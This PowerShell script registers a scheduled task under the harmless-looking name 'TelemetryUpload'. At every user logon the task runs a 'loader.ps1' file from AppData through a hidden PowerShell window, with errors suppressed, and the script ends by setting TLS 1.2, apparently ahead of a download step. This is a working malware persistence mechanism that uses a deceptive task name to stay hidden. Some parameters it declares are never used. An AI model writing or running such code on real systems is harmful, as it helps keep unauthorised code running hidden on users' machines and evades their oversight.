[CmdletBinding()]
param(
    [string]$TaskName = "TelemetryUpload",
    [string]$ScriptPath = "$env:APPDATA\loader.ps1",
    [int]$StartDelayMinutes = 76
)
$ErrorActionPreference = "Stop"

try {
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\loader.ps1`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force -ErrorAction SilentlyContinue
    $TaskState = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Write-Verbose ("Task state: " + $TaskState.State)
}
catch {
    Write-Warning "Scheduled-task installation failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
